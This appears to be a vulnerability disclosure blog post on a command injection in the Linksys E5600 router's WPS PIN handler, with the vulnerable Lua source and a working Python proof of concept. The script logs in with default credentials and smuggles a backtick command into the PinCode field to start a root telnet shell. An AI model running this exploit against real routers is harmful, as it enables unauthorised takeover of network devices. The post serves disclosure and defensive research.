---
title: E5600 Router WPS PIN Command Injection
date: 2021-01-01T00:00:00.000Z
excerpt: A command injection vulnerability found in the WPS PIN handling of the E5600 router — authenticated remote code execution via a crafted WPS PIN parameter
tags:
  - iot
  - router
  - command-injection
  - wps
  - embedded
  - rce
categories:
  - Research
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Target

**Linksys E5600 router**

| Firmware version | Affected |
|---|---|
| 1.1.0.26 | Yes |

Assigned CVE: [CVE-2024-33788](https://nvd.nist.gov/vuln/detail/CVE-2024-33788) (`PinCode` parameter). A second command injection from the same research, via the `ipurl` parameter of the same `/API/info` endpoint, was assigned [CVE-2024-33789](https://nvd.nist.gov/vuln/detail/CVE-2024-33789) and is not covered in this post.

## Vulnerability type

Command injection / remote code execution

## Overview

A command injection vulnerability exists in the WPS PIN registration handler of the Linksys E5600 router. When submitting a device PIN via the router web interface path **Configure -> Wi-Fi -> Wi-Fi Protected Config**, the `PinCode` parameter is passed directly to `os.execute()` without validation. This lets an authenticated attacker inject arbitrary shell commands.

## Root cause

The vulnerability is located at line 491 of `squashfs-root/usr/share/lua/runtime.lua`.

```lua
function runtime.wpsProcess(pt)
    local ret = '"OK"'

    print("wpsProcess")

    if pt["Mode"] == 'PBC' then
        os.execute("wps_action.sh PBC &")

    elseif pt["Mode"] == 'PIN' and pt["PinCode"] ~= nil then

[1]     cmd = 'wps_action.sh PIN '..pt["PinCode"]..' &'
[2]     os.execute(cmd)

    elseif pt["Mode"] == 'STOP' then
        print("wpsProcess STOP")

        cmd = 'ps | grep wps_action.sh | grep -v grep | awk \'{print $1}\' | xargs kill'
        os.execute(cmd)

    else
        print("wpsProcess Fail")
    end

    return ret
end
```

At `[1]`, `pt["PinCode"]` is concatenated directly into the shell command string without any validation or escaping. At `[2]`, the resulting string is passed to `os.execute()` and executed through the system shell. An attacker who controls `PinCode` can use shell metacharacters such as backticks (`` ` ``) or `$()` to escape the intended command context.

## Reproduction

```python
import requests
import json

# Step 1: authenticate, then obtain the session cookie
url1 = 'http://192.168.1.1/cgi-bin/login.cgi'
data1 = {
    "username": "YWRtaW4%3D",
    "password": "YWRtaW4%3D",
    "token": "",
    "source": "web",
    "cn": "",
    "action": "auth"
}
response1 = requests.post(url1, data=json.dumps(data1))

# Step 2: command injection via the WPS PIN parameter
url2 = 'http://192.168.1.1/API/info'
headers2 = {
    'Host': '192.168.1.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.1.1',
    'Referer': 'http://192.168.1.1/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data2 = {
    "wpsProcess": {
        "Mode": "PIN",
        "PinCode": "38316173`/usr/sbin/telnetd -l /bin/sh`"
    }
}
response2 = requests.post(url2, headers=headers2, data=json.dumps(data2))
print(response2.text)
```

The injected payload `` `/usr/sbin/telnetd -l /bin/sh` `` makes the router launch a telnet daemon bound to `/bin/sh`, allowing unauthenticated root shell access after the initial authentication step.

The command actually executed on the device:

```bash
wps_action.sh PIN 38316173`/usr/sbin/telnetd -l /bin/sh` &
```

The shell interprets the backtick-enclosed portion as command substitution, running `/usr/sbin/telnetd -l /bin/sh` before `wps_action.sh` executes.

## Impact

A successful exploit grants root-level code execution on the router. An attacker with access to the router's admin interface (on the local network, or on a management port exposed externally) can:

- Run a persistent backdoor shell (`telnetd`, `dropbear`)
- Tamper with the routing table, DNS settings, and firewall rules
- Sniff or redirect network traffic passing through the device
- Use the device as a pivot point for internal network intrusion

## Discovered by

CoreSecurity OT Research Team
</content>
